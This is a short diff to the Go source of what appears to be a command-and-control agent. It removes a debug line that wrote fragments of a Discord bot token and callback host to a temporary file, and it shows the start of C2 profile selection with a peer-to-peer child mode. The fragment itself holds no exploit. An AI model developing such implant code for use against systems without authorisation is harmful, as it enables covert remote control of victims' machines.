@@ -233,9 +233,6 @@ func runAgent() {
 	// Initialize C2 profile based on configuration
 	var c2 profiles.Profile
 
-	// Debug: trace profile selection to file (temporary)
-	os.WriteFile("/tmp/fawkes-debug.txt", []byte(fmt.Sprintf("tcp=%q discord=%q host=%q\n", tcpBindAddress, discordBotToken[:min(10, len(discordBotToken))], callbackHost[:min(10, len(callbackHost))])), 0644)
-
 	if tcpBindAddress != "" {
 		// TCP P2P mode — this agent is a child that listens for a parent connection
 		log.Printf("bind %s", tcpBindAddress)
